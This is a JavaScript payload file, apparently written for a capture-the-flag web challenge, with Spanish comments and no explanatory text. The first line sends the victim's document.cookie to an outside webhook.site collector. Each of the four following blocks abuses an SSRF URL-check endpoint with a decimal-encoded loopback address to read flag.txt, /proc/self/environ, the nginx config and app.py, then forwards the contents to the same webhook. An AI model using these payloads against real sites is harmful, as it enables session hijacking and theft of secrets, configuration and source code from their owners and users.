// Exfiltrar cookie
fetch('https://webhook.site/83c9e8c3-384e-4bea-a583-b1b1de596d17?c=' + encodeURIComponent(document.cookie));

// SSRF - leer flag.txt
fetch('http://311b405f-4c7f-45d5-94f9-999a49604ce1.ctf.hackconrd.org:8001/check?url=' + 
  encodeURIComponent('http://2130706433/flag.txt'))
  .then(r => r.text())
  .then(data => {
    fetch('https://webhook.site/83c9e8c3-384e-4bea-a583-b1b1de596d17?flag=' + encodeURIComponent(data));
  });

// SSRF - environ
fetch('http://311b405f-4c7f-45d5-94f9-999a49604ce1.ctf.hackconrd.org:8001/check?url=' + 
  encodeURIComponent('http://2130706433/proc/self/environ'))
  .then(r => r.text())
  .then(data => {
    fetch('https://webhook.site/83c9e8c3-384e-4bea-a583-b1b1de596d17?environ=' + encodeURIComponent(data));
  });

// SSRF - nginx config
fetch('http://311b405f-4c7f-45d5-94f9-999a49604ce1.ctf.hackconrd.org:8001/check?url=' + 
  encodeURIComponent('http://2130706433/etc/nginx/nginx.conf'))
  .then(r => r.text())
  .then(data => {
    fetch('https://webhook.site/83c9e8c3-384e-4bea-a583-b1b1de596d17?nginx=' + encodeURIComponent(data));
  });

// SSRF - app.py
fetch('http://311b405f-4c7f-45d5-94f9-999a49604ce1.ctf.hackconrd.org:8001/check?url=' + 
  encodeURIComponent('http://2130706433/app/app.py'))
  .then(r => r.text())
  .then(data => {
    fetch('https://webhook.site/83c9e8c3-384e-4bea-a583-b1b1de596d17?app=' + encodeURIComponent(data));
  });